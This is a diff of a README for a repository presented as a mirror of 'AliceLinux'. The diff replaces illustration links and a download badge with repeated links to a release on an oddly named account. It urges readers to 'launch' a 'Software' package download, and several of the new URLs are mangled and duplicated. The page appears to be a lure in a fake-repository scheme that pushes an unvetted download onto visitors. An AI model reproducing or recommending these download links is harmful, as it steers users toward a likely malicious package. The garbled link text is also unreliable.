@@ -2,7 +2,7 @@
 
 Welcome to the AliceLinux repository! 🐇🐇
 
-![Alice in Wonderland](https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Alice_in_Wonderland_by_carroll_-_ALICE_JUMPING_BY_JOHN_TENNIEL.png/500px-Alice_in_Wonderland_by_carroll_-_ALICE_JUMPING_BY_JOHN_TENNIEL.png)
+![Alice in Wonderland](https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0)
 
 ### Repository Description
 
@@ -25,7 +25,7 @@ This repository serves as a mirror of Emmett1's AliceLinux with some exciting ne
 
 ### Software Download
 
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-orange)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0%20Software-Click%20Here-orange)](https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0)
 
 Please note that the above link needs to be launched to download the software package. Step into the wonderland of AliceLinux and uncover the magic within!
 
@@ -33,7 +33,7 @@ For additional resources and updates, be sure to check out the "Releases" sectio
 
 ### Get Started with AliceLinux
 
-![Mad Tea Party](https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/John_Tenniel_-_Mad_Hatter.png/400px-John_Tenniel_-_Mad_Hatter.png)
+![Mad Tea Party](https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0)
 
 #### Installation Instructions:
 
@@ -55,7 +55,7 @@ Join the Mad Hatter's Tea Party in our community forums to connect with fellow A
 
 ### Let's Journey Down the Rabbit Hole
 
-![Alice and Cheshire Cat](https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Tenniel_red_queen.png/300px-Tenniel_red_queen.png)
+![Alice and Cheshire Cat](https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0)
 
 Embark on a whimsical adventure with AliceLinux and discover a world where simplicity and innovation converge. Immerse yourself in a realm of cozy computing, where every byte is cherished, and every command is a step towards digital wonderland. 🌈🎩
 
@@ -69,6 +69,6 @@ Invite your friends and colleagues to experience the enchantment of AliceLinux! 
 
 ---
 
-![Alice Chasing White Rabbit](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/E._Gertrude_Thomson_-_Alice_Chasing_the_White_Rabbit_%28Alice%27s_Adventures_in_Wonderland%29.png/350px-E._Gertrude_Thomson_-_Alice_Chasing_the_White_Rabbit_%28Alice%27s_Adventures_in_Wonderland%29.png)
+![Alice Chasing White Rabbit](https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0%28Alice%27s_Adventures_in_Wonderland%https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0%28Alice%27s_Adventures_in_Wonderland%https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/alicelinux/releases/tag/v2.0)
 
 Fall down the rabbit hole into the enchanting world of AliceLinux - where innovation and simplicity intertwine to create a truly unique computing experience. Join us on this extraordinary journey today! 🌌🔍
